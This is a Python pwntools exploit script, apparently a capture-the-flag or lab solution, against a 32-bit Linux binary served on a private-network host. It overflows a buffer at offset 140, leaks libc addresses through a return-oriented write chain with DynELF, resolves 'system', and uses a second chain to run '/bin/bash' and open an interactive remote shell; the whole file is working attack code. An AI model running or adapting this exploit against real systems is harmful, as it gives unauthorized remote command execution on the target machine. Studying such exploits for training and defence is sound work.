#!/usr/bin/env python
# coding=utf-8

import os
from pwn import *


context.clear()
context.update(arch='i386', os='linux', endian='little', word_size=32)
context.log_level = 'debug'
log.info(vars(context))


#cyslic offset
cyclic_offset = 140


#exploit the process
# file 'a.out' is the target(you should copy this file from remote to local)
elf = ELF('./a.out')
# remote address
io = remote('192.168.33.127', 8888)


# Create a ROP stack to dump the GOT and return to main()
# so we can exploit again.
@MemLeak
def leak(addr):
    log.debug(io.recvline()) # function 'read' real address in libc(this is for debug)
    log.debug(io.recvline()) # Hello, World
    rop = ROP(elf)
    rop.write(1, addr, 4)
    rop.main()

    io.send(fit({
        cyclic_offset: str(rop)
        }))

    data  = io.recvn(4)
    log.debug(data)
    return data

de = DynELF(elf=elf, leak=leak)
# find function 'system' real address
system = de.lookup('system', 'libc')


# build ROP stack
rop = ROP(elf)
binbash = '/bin/bash\0x00'
# first, we read '/bin/bash/\0x00' string from stdin, and save it to segment '.bss'
rop.read(0, elf.bss(), len(binbash))
# second, we call system with that string
rop.call(system, [elf.bss()])

io.send(fit({
    cyclic_offset: str(rop)
    }))

io.send(binbash) # send string to target

io.interactive()
